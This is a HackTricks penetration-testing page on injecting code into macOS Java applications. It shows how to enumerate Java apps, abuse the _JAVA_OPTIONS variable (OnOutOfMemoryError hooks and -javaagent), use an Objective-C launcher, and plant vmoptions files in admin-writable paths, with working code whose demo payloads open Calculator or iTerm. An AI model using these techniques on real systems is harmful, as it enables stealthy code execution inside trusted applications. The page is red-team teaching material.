# macOS Java Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Enumeration

Find Java applications installed in your system. It was noticed that Java apps in the **Info.plist** will contain some java parameters which contain the string **`java.`**, so you can search for that:

```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```

## \_JAVA\_OPTIONS

The env variable **`_JAVA_OPTIONS`** can be used to inject arbitrary java parameters in the execution of a java compiled app:

```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```

To execute it as a new process and not as a child of the current terminal you can use:

```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        // Specify the file path and content
        NSString *filePath = @"/tmp/payload.sh";
        NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

        NSError *error = nil;

        // Write content to the file
        BOOL success = [content writeToFile:filePath 
                                 atomically:YES 
                                   encoding:NSUTF8StringEncoding 
                                      error:&error];

        if (!success) {
            NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
            return 1;
        }

        NSLog(@"File written successfully to %@", filePath);
        
        // Create a new task
        NSTask *task = [[NSTask alloc] init];

        /// Set the task's launch path to use the 'open' command
        [task setLaunchPath:@"/usr/bin/open"];

        // Arguments for the 'open' command, specifying the path to Android Studio
        [task setArguments:@[@"/Applications/Android Studio.app"]];

        // Define custom environment variables
        NSDictionary *customEnvironment = @{
            @"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
        };

        // Get the current environment and merge it with custom variables
        NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
        [environment addEntriesFromDictionary:customEnvironment];

        // Set the task's environment
        [task setEnvironment:environment];

        // Launch the task
        [task launch];
    }
    return 0;
}
```

However, that will trigger an error on the executed app, another more stealth way is to create a java agent and use:

```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```

{% hint style="danger" %}
Creating the agent with a **different Java version** from the application can crash the execution of both the agent and the application
{% endhint %}

Where the agent can be:

{% code title="Agent.java" %}
```java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
  public static void premain(String args, Instrumentation inst) {
    try {
      String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
      Runtime.getRuntime().exec(commands);
    }
    catch (Exception err) {
      err.printStackTrace();
    }
  }
}
```
{% endcode %}

To compile the agent run:

```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```

With `manifest.txt`:

```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

And then export the env variable and run the java application like:

```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```

## vmoptions file

This file support the specification of **Java params** when Java is executed. You could use some of the previous tricks to change the java params and **make the process execute arbitrary commands**.\
Moreover, this file can also **include others** with the `include` directory, so you could also change an included file.

Even more, some Java apps will **load more than one `vmoptions`** file.

Some applications like Android Studio indicates in their **output where are they looking** for these files, like:

```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```

If they don't you can easily check for it with:

```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```

Note how interesting is that Android Studio in this example is trying to load the file **`/Applications/Android Studio.app.vmoptions`**, a place where any user from the **`admin` group has write access.**

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
